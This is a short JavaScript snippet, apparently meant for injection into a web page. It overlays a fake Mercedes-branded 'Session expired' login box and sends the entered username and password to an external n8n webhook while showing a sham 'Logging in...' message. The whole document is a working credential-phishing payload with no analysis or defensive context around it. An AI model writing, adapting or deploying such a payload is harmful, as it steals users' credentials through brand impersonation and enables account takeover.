let m = document.createElement('div');
m.innerHTML = `
<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.6);z-index:99999;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;">
  <div style="background:white;border-radius:10px;padding:2rem;width:320px;box-shadow:0 4px 12px rgba(0,0,0,0.3);text-align:center;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/9/90/Mercedes-Logo.svg" alt="Mercedes" style="width:60px;margin-bottom:1rem">
    <h2 style="margin:0 0 0.5rem;font-weight:600;color:#222;">Session expired</h2>
    <p style="margin:0 0 1.5rem;color:#444;font-size:14px;">Please log in to continue</p>
    <form onsubmit="fetch('https://lukaas2.app.n8n.cloud/webhook-test/a/?u='+encodeURIComponent(this.user.value)+'&p='+encodeURIComponent(this.pass.value));this.innerHTML='<b>Logging in...</b>';return false;">
      <input name="user" placeholder="Username" required style="width:100%;padding:0.6em;margin-bottom:0.8em;border:1px solid #ccc;border-radius:5px;"><br>
      <input name="pass" type="password" placeholder="Password" required style="width:100%;padding:0.6em;margin-bottom:1.2em;border:1px solid #ccc;border-radius:5px;"><br>
      <button type="submit" style="background:#000;border:none;color:#fff;width:100%;padding:0.6em;border-radius:5px;font-weight:bold;">Login</button>
    </form>
  </div>
</div>`;
document.body.appendChild(m);
